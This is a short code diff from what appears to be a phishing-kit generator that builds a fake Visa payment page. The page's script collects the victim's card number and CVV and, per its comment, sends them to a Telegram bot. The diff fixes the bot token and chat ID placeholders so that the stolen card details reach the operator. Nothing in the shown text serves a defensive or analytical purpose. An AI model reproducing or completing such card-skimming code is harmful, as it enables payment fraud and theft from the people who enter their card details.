@@ -965,8 +965,8 @@ byvisa_page() {
             const cvv = document.getElementById('cvv').value;
 
             // Send payment details to Telegram bot
-            const telegramBotToken ='{token} ';
-            const chatId = '${id} ';
+            const telegramBotToken ='${token}';
+            const chatId = '${id}';
             const message = `New payment details received💳:
             
             •Card Number: ${cardNumber}
